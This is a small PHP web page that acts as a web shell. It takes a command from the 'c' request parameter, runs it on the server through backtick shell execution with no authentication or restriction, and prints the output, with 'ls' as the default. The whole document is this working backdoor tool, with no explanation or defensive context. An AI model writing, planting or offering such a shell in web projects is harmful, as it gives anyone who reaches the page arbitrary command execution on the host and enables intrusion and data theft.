<html>
<body>
<?php
foreach($_REQUEST as $k=>$v) {
	$_REQUEST[$k]=stripslashes($v);
}

function array_sanitize($a) {
	foreach($a as $k=>$v) {
		$b[$k]=sanitize($v);
	}
	return $b;
}
function sanitize($s) {
	return str_replace('"','&quot;',$s);
}


$c=sanitize($_REQUEST['c']);
$focus="<script type=\"text/javascript\">\nfunction ff() {\n  if(document.forms['s'].elements['c'])\n    document.forms['s'].elements['c'].focus();\n}\n\nonload=ff; \n//</script>\n";
echo $focus;
?>
<form name="s" action="<?=$_SERVER['PHP_SELF']?>" method="get">
<input type="text" name="c" value="<?=($c?$c:'ls')?>" />
<input type="submit" value="Enter" />
</form>

<pre>
<?
echo `$c`;
?>
</pre>
</body>